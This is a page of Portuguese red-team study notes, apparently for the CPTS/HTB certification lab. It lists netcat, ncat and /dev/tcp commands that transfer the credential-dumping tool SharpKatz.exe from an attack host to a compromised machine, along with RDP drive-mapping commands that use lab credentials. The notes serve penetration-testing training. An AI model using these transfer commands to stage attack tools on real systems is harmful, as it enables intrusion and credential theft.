> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/file-transfers/miscellaneous-file-transfer-methods.md).

# Miscellaneous File Transfer Methods

### **Netcat**

* **Ncat - Máquina comprometida - Escutando na porta 8000**

```sh
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

* **Netcat - Host de ataque - Enviando arquivo para máquina comprometida**

```
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

* **Ncat - Host de ataque - Enviando arquivo para máquina comprometida**

```sh
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

* **Host de Ataque - Enviando Arquivo como Entrada para Netcat**

```sh
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

* **Máquina comprometida conecta-se ao Netcat para receber o arquivo**

```sh
nc 192.168.49.128 443 > SharpKatz.exe
```

* **Host de Ataque - Enviando Arquivo como Entrada para Ncat**

```sh
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

* **Máquina comprometida conecta-se ao Ncat para receber o arquivo**

```sh
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

* **NetCat - Enviando arquivo como entrada para Netcat**

```sh
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

* **Ncat - Enviando arquivo como entrada para Netcat**

```sh
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

* **Máquina comprometida conectando-se ao Netcat usando /dev/tcp para receber o arquivo**

```sh
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

***

### RDP

* **Montando uma pasta Linux usando rdesktop**

```sh
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

* **Montando uma pasta Linux usando xfreerdp**

```sh
 xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
